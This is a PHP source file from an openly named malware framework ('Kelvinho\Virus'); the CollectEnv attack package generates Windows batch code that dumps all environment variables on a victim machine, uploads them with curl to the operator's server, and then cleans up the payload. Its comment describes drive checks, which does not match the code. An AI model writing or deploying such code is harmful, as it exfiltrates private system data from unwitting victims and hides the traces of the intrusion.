<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScriptWin;

/**
 * Class CollectEnv
 * @package Kelvinho\Virus\Attack\Packages
 *
 * This simply do a bunch of if exist "c:\" (echo true). Returns a string of the available drives.
 */
class CollectEnv extends AttackBase {
    private array $data = [];

    public function setEnv(array $data): void {
        $this->data = $data;
    }

    public function getEnv(): array {
        return $this->data;
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->data = $state["data"];
    }

    protected function getState(): string {
        $state = [];
        $state["data"] = $this->data;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "envFile=@%~pd0env" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function generateBatchCode(): string {
        ob_start(); //@formatter:off ?>
        chCp 65001
        set > %~pd0env
        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean(); //@formatter:on
    }

    public function processExtras(string $resourceIdentifier): void {
    }
}
